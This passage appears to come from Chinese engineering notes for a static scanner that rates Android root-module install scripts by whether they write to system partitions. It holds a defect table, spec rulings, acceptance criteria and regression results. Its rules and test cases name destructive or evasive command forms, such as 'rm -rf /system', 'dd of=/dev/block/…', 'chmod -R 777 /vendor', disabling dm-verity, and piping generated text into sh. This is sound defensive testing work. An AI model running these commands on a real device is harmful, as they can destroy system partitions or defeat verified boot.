| D-04 | R7 词法：漏 `D=/dev/block`（`R7-05/06`）、把 `if=`/`of=` 当赋值（`N-06`） | 用 `名字=` 词法代替 shell 的"行首赋值"语法 | **代码** | 待修 |
| D-05 | Y2 只看"命令后出现过 /system"（`N-01…03`） | 谓词没区分源和目标 | **规范已定**（只看目标） | 代码待改 |
| D-06 | 拼接/解压后执行判绿（`Y4-06…09`、`A5-02/03`） | Y4/Y5 类目不全 | **规范已定**（补 `-c "$VAR"`、`printf … \| sh`、`cat … \| sh`） | 代码待改 |
| D-07 | 截断后照常安装（`A3-01/02`）、第 201 个脚本不扫（`A3-03`） | `truncated` 只打印，不参与判定 | **规范已定**（§2.4 至少黄） | 代码待改 |
| D-08 | `mount … /` 判绿（`Y1-07`） | 名单没有 `/` | **规范已定**（§3 名单含根 `/`） | 代码待改 |
| D-09 | `/vendor_dlkm`、`/system_dlkm` 判绿（`Y2-16/17`） | 名单缺 dlkm | **规范已定**（`/system*`、`/vendor*`） | 代码待改 |
| D-10 | `rm -rf /system`、`chmod -R 777 /vendor` 判绿（`Y2-12/13`） | 模式要求 `/system/` 带尾斜杠 | **规范已定**（允许无尾斜杠） | 代码待改 |
| D-11 | `mkdir`/`touch`/`dd of=` 写系统文件判绿（`Y2-14/15`） | Y2 命令表不全 | **规范已定**（补三类） | 代码待改 |
| D-12 | 只读备份 boot 判红（`N-07`、`N-10`） | R4 不区分读写目标 | **规范已定**（读不算红） | 代码待改 |
| D-13 | `avbtool verify_image`/`info_image` 判红（`R5-05/06`） | R5 模式含 `avbtool` | **规范已定**（只读校验绿） | 代码待改 |
| D-14 | `mount -o remount /system` 判黄（`Y1-08`） | Y1 只看 `remount`，不看 `rw` | **规范已定**（必须出现 rw） | 代码待改 |
| D-15 | 行内 `#` 之后的 `dd of=/dev/block/…` 判红（`N-05`） | 只跳过整行注释 | **代码**（匹配前先剥行内注释） | 待修 |
| D-16 | 恰好 200 个脚本时误印"（已截断）"（`A3-05`） | `walk()` 在 push 后判 `>= MAX_SCRIPTS` | **代码**（低危，仅体验） | 待修 |
| D-17 | 终端 / WebUI 安装不注入 `KSU_PARTITION_GUARD` | 门控在 `module.rs`，注入点在 `KsuCli.kt`（仅管理器 UI） | **规范已定**（默认开启、关闭时显式 `=0`） | 代码待改 |
| D-18 | 规则编译失败被静默丢弃，且本模块零单测 | `compile_rules()` 用 `filter_map(…ok())` | **代码**（`assert!(RULES.len()==compiled.len())` + 本表做单测） | 待修 |
| D-19 | 软链入口不解析（`A3-04`） | 实现直接跳过软链 | **规范已定**（§2.5 解析一跳） | 代码待改 |
| D-20 | Y7 整体未实现（`Y7-01…06` 全绿） | 没有"生成模块根脚本名 / `chmod +x`"这条规则 | **代码** | 待修 |
| D-21 | Y7 未覆盖重定向/heredoc 生成（`Y7-06`） | 实现没有这条规则 | **规范已定**（Y7 已含重定向/heredoc） | 代码待改 |

### 6.3 文档层

| 编号 | 问题 | 状态 |
|---|---|---|
| D-30 | `README.md` §2 曾以现在时描述已删除的 `kernel/feature/partition_guard.c`（6 个 syscall 钩子、双层开关、内核日志样例）。 | **本轮已修**：README §2 已重写为三级静态扫描，并显式标注 4.1.1 删除运行时拦截。 |
| D-31 | README 的"覆盖的分区"仍列 `/system_dlkm /vendor_dlkm`，而静态扫描器没有这两个分区。 | **仍存在**：文档把它写在静态扫描章节里，等于继续承诺未实现的能力（对应 D-09）。 |
| D-32 | `handoff.md` §12.3 曾写"8 组样例…结论符合预期"，其中"系统文件读取"恰好就是本表 `N-01/N-02` 的误报。 | **本轮已修**：已改为"8 条冒烟、未覆盖绕过面"，并引用独立复刻结论。 |

### 6.4 2026-10-31 定案记录

> 时间：2026-10-31。依据：`docs/partition-guard-v2.md` 当轮修订（§1/§2.4/§2.5/§2.6/§3 R4·R5·Y1·Y2·Y4·Y5/Y7/§5.6/§7）。
> 拍板方式：由 lead 在规范里写定，语料按规范改期望，实现随后跟进。

| # | 议题 | 定案 | 对语料的影响 |
|---|---|---|---|
| ① | 读引导分区算不算红 | **不算红，判绿**。备份是正常需求；R4 锚定"写操作目标" | `N-07`、`N-10` 从"待定"改为绿；读备份不再算误报 |
| ② | `avbtool verify_image`/`info_image` | **判绿**。只有 `avbctl` 写操作、`disable-verity`、`set-avb`、`dm-verity … disable` 判红 | `R5-05`/`R5-06` 改为绿 |
| ③ | `mount -o remount <sys>` 不带 `rw` | **判绿**。Y1 口径写明"必须出现 `rw`" | `Y1-08` 改为绿 |
| ④ | 模块外生成的脚本 | **静态扫描不拦**，写进规范边界；模块**目录内**生成的脚本安装后复扫（§2.6） | `A4-01` 判红（复扫）；`A4-02/03` 判绿（不拦） |
| ⑤ | Y7 正式编号 | 安装期生成可执行脚本：`cp/mv/ln/install` 目标为模块根脚本名，或模块内文件 `chmod +x` | 新增 `Y7-01…06` |
| ⑥ | 根挂载 `/` 算不算 Y1 | **算**。§3 新增「系统分区名单」，唯一一份、含根挂载 `/` | `Y1-07` 期望黄（当前漏检），D-08 转「代码待改」 |
| ⑦ | Y7 是否覆盖重定向/heredoc | **覆盖**：`printf … > $MODPATH/service.sh`、`cat <<EOF > …` 都算 | `Y7-06` 依据改为 §3 Y7，D-21 转「代码待改」 |

> ⑦ 项定案后，本表**不再有"待定"行**；剩余全部是"规范已定、代码待改"或"代码待修"。

---

## 7. §7 验收 ↔ 语料映射

> 规范 §7 本次新增三条验收。回归时按这三条给结论，每条都要能指着具体用例说"过/不过"。

| §7 验收项 | 对应语料 | 通过条件 | 当前（4.1.1） |
|---|---|---|---|
| 反绕过 | `A1-01…07`、`A2-01/02`、`A3-01…04`、`A4-01`、`Y7-01…06` | 全部至少判黄，**不允许出现"绿且照装"** | 20 条不达标（7+2+4+1+6，全为漏检） |
| 不误报 | `N-01…N-10` | 全部判绿 | 8 条不达标（`N-01…07`、`N-10`） |
| 失败必须清理 | **不在本表**（§5.6 是安装流程行为，不是判定器行为） | 红 / 音量- / 超时 / 读不到按键 / 安装脚本失败后，`/data/adb/modules_update/<id>` 不存在；重启后不出现于 `modules/` | 未验证（需集成测试） |

> 第三条无法用判定器测：它要求把 `guard_partition()` 的**每一条失败分支**都接到清理逻辑上。
> 回归时建议用四个注入点各跑一次：构造红模块、构造黄模块并按音量-、黄模块不按键等超时、
> `chmod 000 /dev/input` 让按键读不到；再补一个"安装脚本自己 `exit 1`"。

---

## 8. 维护约定

1. **先规范后用例**：新增/修改规则时，先改 `docs/partition-guard-v2.md`，再往本表加号；旧 id 不改。
2. **期望值不随实现改**：实现与期望不符时只更新"当前"标记，不改期望；真要放宽就改规范，并在 §6 留痕。
3. **回归方式**：`ksud-core` 改完后逐条跑本表，把 `**当前 …**` 标记清零；§6 的 D 表每关一条就更新"状态"。
4. **id 命名**：`R<n>-<两位>` / `Y<n>-<两位>` / `G-<两位>` / `A<节>-<两位>` / `N-<两位>`；
   差异编号（D 表）不占用例号。
5. **真机项不在本表内**：音量键三条路径（音量+ / 音量- / 不按）、zip 是否保留软链，
   归 `handoff.md` 的"验证边界"。

---

## 9. 回归记录（2026-10-31，修复后 `3a66988d`）

> 同一份 145 条语料、同一口径；「修复前」= `e54b0379` 的逐行复刻，「修复后」= `3a66988d` 扫描器的 Python 模型
> （复刻了续行拼合、行内注释剥离、两趟变量展开、首命中规则表、截断/oversized 抬黄、软链一跳解析）。

| 指标 | 修复前 | 修复后 |
|---|---|---|
| 与期望不符 | **48** | **1** |
| 反绕过（20 条口径） | 20 不达标 | 0 不达标 |
| 不误报（`N-01…N-10`） | 8 不达标 | 0 不达标 |
| 交叉验证（旧 125 条套件） | 39 不达标 | **1**（`T1-2MiB-pad`，已确认 fixture 无效） |

**剩余唯一一条**：`A4-02` —— 期望绿、实测黄，命中 `Y7/YELLOW_DYNAMIC_OF`。原因是 `of=$D` 本身就属于
「写入目标无法静态确定」，与「模块外生成的内容不复扫」无关；**是 fixture 设计冲突，不是实现缺陷**。
把 payload 改成不含 `of=$VAR`（例如 `echo 'echo hello' > /data/adb/stage2.sh`）后实测为绿。

### §7 三条验收

| 验收项 | 结论 | 证据 |
|---|---|---|
| 反绕过 | **过** | `A1-01…07` 红/黄、`A2-01/02` 红、`A3-01` 黄(`Y8`)、`A3-02` 红、`A3-03` 红、`A3-04` 红（软链一跳解析）、`A4-01` 黄+复扫红、`Y7-01…06` 黄；无「绿且照装」 |
| 不误报 | **过** | `N-01…N-10` 全部绿（含读 `/system`、备份 boot、行内注释、`remount,ro`、overlay 内 `sed -i`） |
| 失败必须清理 | **部分过（需真机/流程验证）** | 代码路径：`finish_install()` 的返回值被 `discard_staged_module()` 包住，红/音量-/超时/读不到键/安装脚本失败都会删 `modules_update/<id>`；**但 ksud 没有 SIGINT 处理**，Ctrl-C 直接杀进程时不会走清理。测法：四个注入点 + `kill -INT`，判据是目录消失且重启不进 `modules/` |
